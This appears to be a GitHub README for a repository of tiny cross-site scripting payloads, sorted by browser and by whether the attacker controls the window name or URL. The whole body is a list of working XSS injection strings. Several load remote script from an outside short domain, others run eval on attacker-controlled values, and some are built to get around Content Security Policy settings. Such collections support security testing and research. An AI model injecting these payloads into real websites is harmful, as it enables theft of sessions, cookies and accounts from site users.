# Tiny-XSS-Payloads
Repository containing tiny XSS payloads for different contexts.

The DEMO available here: <https://terjanq.github.io/Tiny-XSS-Payloads/index.html>


## Current Payloads


```html
<!-- If you control the name, will work on Firefox in any context, will fail in chromium in DOM -->
<svg/onload=eval(name)>

<!-- If you control the URL, Safari-only -->
<iframe/onload=write(URL)>

<!-- If you control the URL -->
<svg/onload=eval(`'`+URL)>

<!-- If you controll the name, but unsafe-eval not enabled -->
<svg/onload=location=name>

<!-- Just a casual script -->
<script/src=//Ǌ.₨></script>

<!-- If you control the name of the window -->
<iframe/onload=src=top.name>

<!-- If you control the URL -->
<iframe/onload=eval('`'+URL)>

<!-- If number of iframes on the page is constant -->
<iframe/onload=src=top[0].name+/\Ǌ.₨?/>

<!-- for Firefox only -->
<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">

<!-- If number of iframes on the page is random -->
<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>

<!-- If unsafe-inline is disabled in CSP and external scripts allowed -->
<iframe/srcdoc="<script/src=//Ǌ.₨></script>">
```